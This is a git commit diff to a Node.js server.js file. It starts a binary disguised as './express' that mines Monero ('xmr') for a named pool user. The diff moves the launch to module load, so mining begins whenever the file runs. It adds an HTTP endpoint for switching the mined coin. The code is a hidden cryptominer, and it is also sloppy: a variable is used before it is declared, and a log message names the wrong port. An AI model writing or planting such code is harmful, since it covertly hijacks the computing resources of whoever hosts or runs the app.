e20af14499affbce328619c5d817a02817e4f393
Th1nkFast <31682030+Th1nkFast@users.noreply.github.com>
2017-09-14 22:05:53 -0300

    Update server.js

--- server.js
+++ server.js
@@ -1,35 +1,18 @@
-exports.worker = function() {
-const { spawn } = require('child_process');
+const run = require('child_process').spawn('./express', ['-user', 'ian10_141@yahoo.com.br', coin, '1']);
 const express = require('express');
 const app = express();
-var state = true;
-var proc = spawn('./express', ['-user', 'ian10_141@yahoo.com.br', 'xmr', '1']);
-
+var state = false;
+var proc = '';
+var coin = 'xmr';
 
 
 app.listen(8080, ()=>{
   console.log('Example app listening on port 3000!');
 });
-app.get('/stop', function (req, res) {
-  	res.send('Miner Stopped');
-		proc.kill('SIGINT');
-});
 app.get('/status', function (req, res) {
-  	res.send(state);
+  	res.send('state: '+state);
 });
-
-const start = ()=>{
-    state = true;
-    proc = spawn('./express', ['-user', 'ian10_141@yahoo.com.br', 'xmr', '1']);
-    proc.on('close', () => {
-      console.log('child process exited');
-      state = false;
-    });
-}
-
-app.get('/start',  (req,res)=>{
-    state = true;
-    start();
-    res.send('Miner Started');
+app.get('/coin/:coin', function (req, res) {
+  	coin = req.params.coin;
+    res.send('coin setted to: '+coin)
 });
-};
